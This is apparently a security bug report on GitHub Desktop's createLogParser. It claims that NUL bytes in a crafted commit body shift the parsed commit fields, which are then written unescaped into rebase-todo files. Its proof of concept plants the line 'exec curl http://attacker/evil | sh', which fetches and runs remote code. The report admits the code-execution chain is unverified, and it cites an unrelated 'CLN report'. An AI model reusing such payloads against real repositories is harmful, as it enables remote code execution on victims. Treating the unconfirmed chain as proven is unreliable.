### Title
Attacker-controlled commit content desynchronizes `createLogParser`'s fixed-stride field parser, corrupting `Commit.sha`/`summary` that are later written unescaped into rebase-todo files - (File: `app/src/lib/git/git-delimiter-parser.ts`)

### Summary
`createLogParser` builds `Commit` objects from `git log -z --format=...` output by splitting the raw stdout buffer on NUL (`\0`) bytes and grouping the resulting records into fixed-size chunks, one chunk per requested field (`sha`, `summary`, `body`, `author`, `parents`, `trailers`, `refs`, …). [1](#0-0)  This is the exact bug class from the report: a parser that assumes a constant record-to-object stride, without verifying that each "slot" actually corresponds to one logical field. In the CLN report, `fromwire_added_htlc` was indexed with `*added + i` assuming a fixed element size that didn't match the actual (variadic tal) object, corrupting memory. Here, the same "fixed stride over variable-size attacker data" assumption is used for `%b` (commit body), which is git-content controlled and can legitimately contain a raw `\0` byte in a maliciously crafted commit object (constructed via low-level plumbing such as `git hash-object`/`git commit-tree` and pushed to a repo the victim later clones or fetches). Any embedded `\0` in the body is indistinguishable from the intended `%x00` field separator to `splitBuffer`, producing one extra record and shifting every subsequent field/commit by one position for the remainder of the parse. [2](#0-1)  `getCommits` in `log.ts` uses exactly this parser with `body: '%b'` among the fields. [3](#0-2) 

### Finding Description
`createLogParser`'s `parse` function does no validation that the number of split records is an exact multiple of `keys.length`, nor that record boundaries align to field boundaries — it simply walks the flat array in fixed strides of `keys.length`: [4](#0-3) 
This is safe only if the underlying `\0` bytes produced by git are exclusively the ones inserted by the `%x00` format specifiers. That invariant is broken because one of the parsed fields, `%b` (raw commit body) is fully attacker-controlled content taken from a commit object crafted with low-level git tooling, which is not restricted to "text safe for NUL-delimited parsing" — a commit object's message is stored with an explicit length, not NUL-terminated, so it can contain literal `\0` bytes.

Once a victim clones/fetches such a repository and GitHub Desktop calls `getCommits`, the extra `\0` in the malicious commit's body causes every field after it (for that commit and all subsequent commits in the log) to be off-by-one: `sha` fields end up holding data that git intended as `parents`, `summary` ends up holding fragments of `author`, etc. [5](#0-4) 

This corrupted `Commit` data is not just displayed — it flows unsanitized into destructive Git operations. `reorder.ts` (used by the Reorder/"drag commit" multi-commit-operation feature) writes the parsed, attacker-influenced `commit.sha` and `commit.summary` directly into a rebase-todo file with no escaping or validation: [6](#0-5) [7](#0-6) 
That todo file is then handed to `rebaseInteractive`, i.e., `git rebase --interactive`, which executes it line-by-line. [8](#0-7)  Interactive rebase todo files are a command script (`pick`, `reword`, `edit`, `exec`, …), not free text, so if desynchronization causes a field slot that is supposed to be a short single-line `summary` to actually contain multi-line content taken from `%b` (which legitimately may contain newlines, since -z only changes the record terminator, not intra-field escaping), the injected text can add extra lines to the todo file. Existing guards do not stop this: there is no newline-stripping/escaping of `commit.summary` before it is interpolated into the todo file, and `createLogParser` performs no bounds/alignment check before trusting record positions.

### Impact Explanation
The corrupted value is `Commit.sha` / `Commit.summary` (and other fields) produced from a desynchronized parse of attacker-supplied repository data. Because these fields are subsequently written verbatim into a `git-rebase-todo` file that git itself interprets as a script of commands, an attacker who controls a repository the victim clones/fetches can cause GitHub Desktop to silently rewrite history incorrectly (wrong commit picked/dropped — "silent corruption of what the user commits or pushes") or, in the stronger case where the desynchronized content lands in the todo file as an additional line, potentially smuggle a new rebase-todo directive (e.g. an `exec` line) that git will execute as a shell command during the user's normal reorder/squash operation. This crosses from parser corruption into unprivileged code execution triggered by an attacker-controlled remote/cloned repository, matching the accepted impact categories.

### Likelihood Explanation
Requires the victim to clone/fetch an attacker-controlled repository and use a feature that calls `getCommits` on a range including the malicious commit (log view, or a multi-commit operation such as Reorder/Squash/Cherry-pick, which all rely on `Commit` objects built this way). No admin rights, local access, or social engineering beyond "use a repository you cloned" is needed. Producing a commit object with an embedded raw NUL byte in its message requires only ordinary plumbing commands (`git hash-object -w --stdin -t commit`, `git update-ref`) available to anyone who can push to or serve a repository — no elevated git internals knowledge beyond crafting a raw object.

### Recommendation
- In `createLogParser`, do not assume alignment: validate that `records.length` is exactly `n * keys.length` (plus any expected trailing empty record) before grouping, and fail/skip rather than silently continuing on mismatch.
- Prefer parsing strategies that are robust to attacker-controlled `\0` bytes in freeform fields (e.g., request git to strip/escape embedded NULs, or place freeform multi-line fields such as `%b` last and read them via a bounded/length-prefixed mechanism instead of relying purely on delimiter counting).
- In `reorder.ts`, `squash.ts`, and any other code that appends `commit.sha`/`commit.summary` into a rebase-todo file, sanitize the values (reject/strip embedded newlines and validate `sha` matches `^[0-9a-f]{40}$` / summary contains no `\n`) before writing them into a file that git will interpret as an executable script.

### Proof of Concept
1. In a scratch repo, craft a commit object with a NUL byte embedded in its message body using low-level plumbing, e.g.:
   ```
   printf 'tree <TREE_SHA>\nparent <PARENT_SHA>\nauthor A <a@a> 0 +0000\ncommitter A <a@a> 0 +0000\n\nnormal subject\n\x00exec curl http://attacker/evil | sh\n' | git hash-object -w -t commit --stdin
   ```
   and set a branch/tag to point at it.
2. Publish this repository and have the victim clone/fetch it in GitHub Desktop.
3. In Desktop, select a range of commits including the crafted one and perform a Reorder or Squash operation, which calls `getCommits` → `createLogParser.parse` → `reorder.ts`'s `appendFile(todoPath, ...)`.
4. Because of the embedded `\0`, the parsed `Commit` fields for this and following commits are shifted by one; observe (a) commit history rewritten with mismatched SHAs/messages, and, depending on exact field alignment achieved, (b) an extra line injected into the generated `git-rebase-todo` file that `git rebase --interactive` will attempt to execute as a todo command.

Note: I was not able to execute this against a live git/Desktop build to confirm git's exact NUL-handling behavior for `%b` end-to-end (e.g., whether git's own pretty-printer strips or preserves a raw NUL inside a commit body verbatim across versions) — this should be validated empirically before treating the RCE escalation as proven; the field-desynchronization parsing bug in `git-delimiter-parser.ts` itself, however, is directly verifiable from the source shown above.

export function createLogParser<T extends Record<string, string>>(fields: T) {
  const keys: Array<keyof T> = Object.keys(fields)
  const format = Object.values(fields).join('%x00')
  const formatArgs = ['-z', `--format=${format}`]

  const parse = <V extends string | Buffer>(value: V) => {
    const records = (
      Buffer.isBuffer(value) ? splitBuffer(value, '\0') : value.split('\0')
    ) as V[]
    const entries = []

    for (let i = 0; i < records.length - keys.length; i += keys.length) {
      const entry = {} as { [K in keyof T]: V }
      keys.forEach((key, ix) => (entry[key] = records[i + ix]))
      entries.push(entry)
    }

    return entries
  }

  return { formatArgs, parse }
}
